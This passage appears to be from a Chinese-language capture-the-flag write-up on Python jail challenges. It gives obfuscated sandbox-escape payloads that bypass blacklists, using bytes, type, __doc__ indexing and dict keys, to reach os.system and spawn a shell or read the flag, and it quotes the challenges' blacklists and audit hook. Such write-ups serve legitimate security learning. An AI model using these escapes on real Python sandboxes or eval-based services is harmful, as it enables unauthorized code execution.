class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;pass&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Nooo!!!!&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WELCOME = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;  _       _          _       _          _       _        &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; | |     | |        | |     | |        | |     | |       &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; | | (_| |   &amp;lt;  __/ | | (_| |   &amp;lt;  __/ | | (_| |   &amp;lt;  __/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt; |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(WELCOME)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Now the program has two functions&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;can you use dockerdoor&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1.func&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;2.backdoor&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;input_data = &lt;span class=&#34;built_in&#34;&gt;input&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;gt; &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(input_data == &lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    func()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt;(input_data == &lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    backdoor()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;not found the choice&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    exit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;先走 1 通道拿到 key 然后到 2 验证&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/oXO6yphTng82Wrt.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/cF5eb8VijKOnsyP.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;lke-lke-lke&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lke-lke-lke&#34;&gt;#&lt;/a&gt; l@ke l@ke l@ke&lt;/h3&gt;
&lt;p&gt;还是两步走，通道 1，长度不超过 6 来获取 key，通道 2 验证 key&lt;/p&gt;
&lt;p&gt;对于通道 1，我们调用 &lt;code&gt;help()&lt;/code&gt;  进入函数，输入 &lt;code&gt;server&lt;/code&gt;  查看 key&lt;br&gt;
&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/kAnQM9qpgbdLOF6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/HYlOA8tLzQqD3x5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;calc_jail_beginner_level4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level4&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level4&lt;/h3&gt;
&lt;p&gt;将 &lt;code&gt;&#39;__loader__&#39;, &#39;__import__&#39;, &#39;compile&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;chr&#39;&lt;/code&gt;  等函数都 ban 掉了 后面又将单引号、双引号、反斜杠、反引号给 ban 了&lt;/p&gt;
&lt;p&gt;尝试使用之前的 SSTI 注入 先查询 object 类下的子类 查看可以使用的模块&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__base__.__subclasses__()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;发现可以使用 os 模块&lt;/p&gt;
&lt;p&gt;禁用了 chr，可以使用 byte []&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/C2ihAFwdWP8kR7r.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;另外，同样是使用 bytes () 函数 猜测 flag 文件的位置和名字 可以直接对  &lt;code&gt;open(&#39;flag&#39;).read()&lt;/code&gt;  进行转化 直接读取 flag&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;open(bytes([102,108,97,103]).decode()).read()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;calc_jail_beginner_level405&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level405&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level4.0.5&lt;/h3&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/xKwXD1flzSsPWyB.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;calc_jail_beginner_level41&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level41&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level4.1&lt;/h3&gt;
&lt;p&gt;没有 hint 了，接下来就是脑洞的碰撞了&lt;/p&gt;
&lt;p&gt;连接靶机&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and &lt;/code&gt; ,&amp;quot;,’ `&lt;/p&gt;
&lt;p&gt;bytes [] 被 ban 了，就需要用 type 了，二者的关系：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;system == [bytes([115,121,115,116,101,109]).decode()]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;system&amp;quot; == (type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;利用下面 payload 可以执行 ls，同理可以 &lt;code&gt;cat flag&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115])+type(str(1).encode())([121])+type(str(1).encode())([115])+type(str(1).encode())([116])+type(str(1).encode())([101])+type(str(1).encode())([109])).decode()]((type(str(1).encode())([108])+type(str(1).encode())([115])).decode())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/ov8fnNjB6uL1Dza.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;也可以利用 Show subclasses with tuple 找到 bytes 类：结果为 bytes 类的索引为 6&lt;/p&gt;
&lt;p&gt;可以构造 payload 拿到 sh&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115, 121, 115, 116, 101, 109]).decode()](().__class__.__base__.__subclasses__()[6]([115, 104]).decode())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/cCetM5DzxWAsQK8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;也可以利用 &lt;code&gt;__doc__&lt;/code&gt; getshell&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__doc__[19]+().__doc__[86]+().__doc__[19]+().__doc__[4]+().__doc__[17]+().__doc__[10]](().__doc__[19]+().__doc__[56])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;calc_jail_beginner_level42&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level42&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level4.2&lt;/h3&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,byte and `,&amp;quot;,&amp;#x27;,+ Good luck!&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;加号被 ban 了，可以用 &lt;code&gt;__add__&lt;/code&gt; 代替&lt;/p&gt;
&lt;p&gt;跟 4.1 类似执行 &lt;code&gt;system(&amp;quot;flag_y0u_CaNt_FiNd_mE&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[(type(str(1).encode())([115]).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([115])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([101])).__add__(type(str(1).encode())([109]))).decode()]((type(str(1).encode())([99]).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([32])).__add__(type(str(1).encode())([102])).__add__(type(str(1).encode())([108])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([103])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([121])).__add__(type(str(1).encode())([48])).__add__(type(str(1).encode())([117])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([67])).__add__(type(str(1).encode())([97])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([116])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([70])).__add__(type(str(1).encode())([105])).__add__(type(str(1).encode())([78])).__add__(type(str(1).encode())([100])).__add__(type(str(1).encode())([95])).__add__(type(str(1).encode())([109])).__add__(type(str(1).encode())([69]))).decode())&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/xXR5rLibdj3B26q.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;也可以继续用 4.1 的利用 bytes 索引的 payload&lt;/p&gt;
&lt;p&gt;和利用 &lt;code&gt;__doc__&lt;/code&gt; 的方法，但需要利用 &lt;code&gt;join&lt;/code&gt;  的拼接方式&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([().__doc__[19],().__doc__[86],().__doc__[19],().__doc__[4],().__doc__[17],().__doc__[10]])](str().join([().__doc__[19],().__doc__[56]]))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h3 id=&#34;calc_jail_beginner_level43&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level43&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level4.3&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;Banned __loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes,open,type and &lt;/code&gt; ,&amp;quot;,’,+`&lt;/p&gt;
&lt;p&gt;type 也被 ban 了，还可以利用 &lt;code&gt;list(dict(system=114514))[0]&lt;/code&gt;  获取 &lt;code&gt;system&lt;/code&gt;  这个字符串&lt;/p&gt;
&lt;p&gt;因此直接执行 &lt;code&gt;system(sh)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[].__class__.__mro__[-1].__subclasses__()[-4].__init__.__globals__[list(dict(system=1))[0]](list(dict(sh=1))[0])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/07/sBJqXm4ic39ZnxO.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;并且，上面两道题的后两种方法还可以用&lt;/p&gt;
&lt;h3 id=&#34;calc_jail_beginner_level51&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#calc_jail_beginner_level51&#34;&gt;#&lt;/a&gt; calc_jail_beginner_level5.1&lt;/h3&gt;
&lt;p&gt;尝试之后发现 &lt;code&gt;import&lt;/code&gt; 、 &lt;code&gt;open&lt;/code&gt;  都被 ban 了&lt;/p&gt;
&lt;p&gt;尝试 &lt;code&gt;dir()&lt;/code&gt; ：&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/08/vCoTzceO1lr8d43.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;一路跟进&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/08/pR4b81VMro3AYzF.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现 encode，直接利用&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/05/08/aU1losjKCz6pn7q.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;lake-lake-lake-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#lake-lake-lake-2&#34;&gt;#&lt;/a&gt; lake lake lake&lt;/h3&gt;
&lt;p&gt;hook 了很多函数&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;my_audit_hook&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;event, _&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BALCKED_EVENTS = &lt;span class=&#34;built_in&#34;&gt;set&lt;/span&gt;(&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;pty.spawn&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;os.system&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;os.exec&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;os.posix_spawn&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;os.spawn&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;subprocess.Popen&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;code.__new__&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;function.__new__&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;cpython._PySys_ClearAuditHooks&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;open&amp;#x27;&lt;/span&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; event &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; BALCKED_EVENTS:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;raise&lt;/span&gt; RuntimeError(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Operation banned: &amp;#123;&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(event))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;分析一下猜数字的函数&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Python&#34;&gt;&lt;figure class=&#34;iseeu highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;guesser&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    game_score = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sys.stdout.write(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Can u guess the number? between 1 and 9999999999999 &amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sys.stdout.flush()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    right_guesser_question_answer = random.randint(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;9999999999999&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span 